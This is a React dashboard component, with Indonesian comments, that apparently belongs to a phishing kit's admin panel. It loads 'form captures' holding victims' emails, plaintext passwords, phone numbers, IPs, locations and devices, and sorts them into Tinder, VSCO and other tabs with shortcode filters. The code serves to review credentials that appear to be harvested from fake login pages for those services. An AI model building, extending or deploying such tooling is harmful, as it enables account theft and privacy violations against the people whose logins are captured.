'use client';

import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { useEffect, useState } from 'react';
import { LoadingState } from './components/loading-state';
import { ErrorState } from './components/error-state';
import { FilterSection } from './components/filter-section';
import { FormCaptureTable } from './components/form-capture-table';
import { HeaderSection } from './components/header-section';
import { getSourceColor, getSourceIcon } from './components/utils';

interface FormCaptureData {
  id: string;
  source: string;
  email: string | null;
  password: string | null;
  name: string | null;
  phone: string | null;
  additional_data: any;
  ip: string | null;
  country: string | null;
  city: string | null;
  browser: string | null;
  device: string | null;
  os: string | null;
  created_at: bigint | null;
  shortcode?: string | null;
}

interface FiltersState {
  source: string | null;
  shortcode: string | null;
  showFilters: boolean;
  isAdmin?: boolean;
}

export function FormCapturesView() {
  const [formCaptures, setFormCaptures] = useState<FormCaptureData[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [filters, setFilters] = useState<FiltersState>({
    source: null,
    shortcode: null,
    showFilters: false,
    isAdmin: false,
  });
  const [shortcodeInput, setShortcodeInput] = useState('');

  const fetchFormCaptures = async () => {
    setIsLoading(true);
    try {
      let url = '/api/dashboard/form-captures';

      // Tambahkan parameter query jika filter aktif
      const queryParams = new URLSearchParams();
      if (filters.source) queryParams.append('source', filters.source);
      if (filters.shortcode) queryParams.append('shortcode', filters.shortcode);

      if (queryParams.toString()) {
        url += `?${queryParams.toString()}`;
      }

      const response = await fetch(url);

      if (!response.ok) {
        throw new Error('Failed to fetch form captures');
      }

      const data = await response.json();
      setFormCaptures(data.data || []);
      console.log('data', data);
      // Update isAdmin status jika ada di respons
      if (data.filters && data.filters.hasOwnProperty('isAdmin')) {
        setFilters((prev) => ({ ...prev, isAdmin: data.filters.isAdmin }));
      }
    } catch (err) {
      console.error('Error fetching form captures:', err);
      setError('Failed to load form captures data');
    } finally {
      setIsLoading(false);
    }
  };

  // Jalankan fetchFormCaptures saat komponen dimuat atau filter berubah
  useEffect(() => {
    fetchFormCaptures();
  }, [filters.source, filters.shortcode]);

  // Handler untuk mengubah filter source
  const handleSourceChange = (value: string) => {
    setFilters((prev) => ({ ...prev, source: value === 'all' ? null : value }));
  };

  // Handler untuk mengubah filter shortcode
  const handleShortcodeFilter = () => {
    setFilters((prev) => ({
      ...prev,
      shortcode: shortcodeInput.trim() === '' ? null : shortcodeInput.trim(),
    }));
  };

  // Handler untuk mereset filter
  const handleResetFilters = () => {
    setFilters({ source: null, shortcode: null, showFilters: false });
    setShortcodeInput('');
  };

  // Toggle tampilan filter
  const toggleFilters = () => {
    setFilters((prev) => ({ ...prev, showFilters: !prev.showFilters }));
  };

  // Filter form captures berdasarkan source untuk tab
  const tinderCaptures = formCaptures.filter(
    (capture) => capture.source.toLowerCase() === 'tinder',
  );
  const vscoCaptures = formCaptures.filter(
    (capture) => capture.source.toLowerCase() === 'vsco',
  );
  const otherCaptures = formCaptures.filter(
    (capture) => !['tinder', 'vsco'].includes(capture.source.toLowerCase()),
  );

  if (isLoading) {
    return <LoadingState />;
  }

  if (error) {
    return <ErrorState message={error} />;
  }

  return (
    <div className='space-y-6'>
      <HeaderSection
        filters={filters}
        onToggleFilters={toggleFilters}
        onRefresh={fetchFormCaptures}
      />

      <FilterSection
        filters={filters}
        shortcodeInput={shortcodeInput}
        onSourceChange={handleSourceChange}
        onShortcodeInputChange={setShortcodeInput}
        onShortcodeFilter={handleShortcodeFilter}
        onResetFilters={handleResetFilters}
      />

      <Tabs defaultValue='all' className='space-y-4'>
        <TabsList>
          <TabsTrigger value='all'>Semua ({formCaptures.length})</TabsTrigger>
          <TabsTrigger value='tinder'>
            Tinder ({tinderCaptures.length})
          </TabsTrigger>
          <TabsTrigger value='vsco'>VSCO ({vscoCaptures.length})</TabsTrigger>
          <TabsTrigger value='other'>
            Lainnya ({otherCaptures.length})
          </TabsTrigger>
        </TabsList>

        <TabsContent value='all' className='space-y-4'>
          <FormCaptureTable
            formCaptures={formCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>

        <TabsContent value='tinder' className='space-y-4'>
          <FormCaptureTable
            formCaptures={tinderCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>

        <TabsContent value='vsco' className='space-y-4'>
          <FormCaptureTable
            formCaptures={vscoCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>

        <TabsContent value='other' className='space-y-4'>
          <FormCaptureTable
            formCaptures={otherCaptures}
            getSourceColor={getSourceColor}
            getSourceIcon={getSourceIcon}
          />
        </TabsContent>
      </Tabs>
    </div>
  );
}
